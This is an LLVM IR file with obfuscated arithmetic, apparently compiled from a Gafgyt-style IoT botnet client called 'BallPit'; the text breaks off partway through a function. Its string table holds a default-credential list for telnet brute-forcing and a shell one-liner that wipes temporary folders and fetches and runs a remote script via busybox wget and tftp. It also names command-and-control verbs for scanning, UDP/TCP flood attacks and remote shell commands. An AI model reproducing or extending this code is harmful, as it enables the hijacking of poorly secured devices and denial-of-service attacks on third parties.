; ModuleID = 'host/ir_sub/BallPit.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@passwords = global [16 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.71 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.17 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.18 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.21 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.24 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.26 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.28 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [214 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http:///.sh; sh .sh; wget1 http:///.sh; sh .sh; busybox tftp -r tftp.sh -g ; sh tftp.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.34 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.38 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.42 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.46 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.47 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"SCANNER STOPPED!\0A\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.51 = private unnamed_addr constant [18 x i8] c"SCANNER STARTED!\0A\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.58 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.59 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"ART OF WAR\00", align 1
@.str.62 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.70 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 %5, 55787494
  %7 = add i32 %6, -1640531527
  %8 = add i32 %7, 55787494
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = add i32 %10, 305541374
  %12 = add i32 %11, -1640531527
  %13 = sub i32 %12, 305541374
  %14 = add i32 %10, -1640531527
  %15 = sub i32 %13, -437790019
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -437790019
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %65, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %71

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = sub i32 0, 3
  %25 = add i32 %23, %24
  %26 = sub nsw i32 %23, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = sub i32 %30, 1896292328
  %32 = sub i32 %31, 2
  %33 = add i32 %32, 1896292328
  %34 = sub nsw i32 %30, 2
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %29, -1
  %39 = and i32 851114906, %38
  %40 = xor i32 851114906, -1
  %41 = and i32 %29, %40
  %42 = xor i32 %37, -1
  %43 = and i32 %42, 851114906
  %44 = and i32 %37, %40
  %45 = or i32 %39, %41
  %46 = or i32 %43, %44
  %47 = xor i32 %45, %46
  %48 = xor i32 %29, %37
  %49 = xor i32 %47, -1
  %50 = and i32 -1640531527, %49
  %51 = xor i32 -1640531527, -1
  %52 = and i32 %47, %51
  %53 = or i32 %50, %52
  %54 = xor i32 %47, -1640531527
  %55 = load i32, i32* %3, align 4
  %56 = xor i32 %53, -1
  %57 = and i32 %55, %56
  %58 = xor i32 %55, -1
  %59 = and i32 %53, %58
  %60 = or i32 %57, %59
  %61 = xor i32 %53, %55
  %62 = load i32, i32* %3, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  br label %65

; <label>:65:                                     ; preds = %22
  %66 = load i32, i32* %3, align 4
  %67 = add i32 %66, 108702846
  %68 = add i32 %67, 1
  %69 = sub i32 %68, 108702846
  %70 = add nsw i32 %66, 1
  store i32 %69, i32* %3, align 4
  br label %19

; <label>:71:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 %9, -1
  %12 = xor i32 4095, -1
  %13 = xor i32 279343067, -1
  %14 = or i32 %11, %12
  %15 = or i32 279343067, %13
  %16 = xor i32 %14, -1
  %17 = and i32 %16, %15
  %18 = and i32 %9, 4095
  store i32 %17, i32* @rand_cmwc.i, align 4
  %19 = load i64, i64* %2, align 8
  %20 = load i32, i32* @rand_cmwc.i, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = mul i64 %19, %24
  %26 = load i32, i32* @c, align 4
  %27 = zext i32 %26 to i64
  %28 = sub i64 0, %27
  %29 = sub i64 %25, %28
  %30 = add i64 %25, %27
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = sub i64 %34, 7495541901001054465
  %38 = add i64 %37, %36
  %39 = add i64 %38, 7495541901001054465
  %40 = add i64 %34, %36
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* %3, align 4
  %50 = load i32, i32* @c, align 4
  %51 = sub i32 0, %50
  %52 = sub i32 0, 1
  %53 = add i32 %51, %52
  %54 = sub i32 0, %53
  %55 = add i32 %50, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = add i32 %57, 1389805008
  %60 = sub i32 %59, %58
  %61 = sub i32 %60, 1389805008
  %62 = sub i32 %57, %58
  %63 = load i32, i32* @rand_cmwc.i, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 4320605994353185689
  %9 = sub i64 %8, 1
  %10 = add i64 %9, 4320605994353185689
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %27

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %4, align 4
  br label %13

; <label>:27:                                     ; preds = %13
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = add i32 %44, 853322389
  %46 = add i32 %45, -1
  %47 = sub i32 %46, 853322389
  %48 = add nsw i32 %44, -1
  store i32 %47, i32* %5, align 4
  br label %28

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %70, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %75

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = sub i32 %62, 358588368
  %65 = sub i32 %64, %63
  %66 = add i32 %65, 358588368
  %67 = sub nsw i32 %62, %63
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %61, i64 %68
  store i8 %60, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 0, 1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, 1
  store i32 %73, i32* %3, align 4
  br label %51

; <label>:75:                                     ; preds = %51
  %76 = load i8*, i8** %2, align 8
  %77 = load i32, i32* %3, align 4
  %78 = load i32, i32* %4, align 4
  %79 = add i32 %77, 1166705957
  %80 = sub i32 %79, %78
  %81 = sub i32 %80, 1166705957
  %82 = sub nsw i32 %77, %78
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds i8, i8* %76, i64 %83
  store i8 0, i8* %84, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %331, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %334

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %318

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %334

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %319

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = add i32 %76, -222326491
  %78 = sub i32 %77, 48
  %79 = sub i32 %78, -222326491
  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = sub i32 0, %79
  %83 = sub i32 %81, %82
  %84 = add nsw i32 %81, %79
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %133

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %108

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = sub i32 0, %96
  %104 = sub i32 0, 8
  %105 = add i32 %103, %104
  %106 = sub i32 0, %105
  %107 = add i32 %96, 8
  store i32 %106, i32* %95, align 8
  br label %113

; <label>:108:                                    ; preds = %93
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %98
  %114 = phi i32* [ %102, %98 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
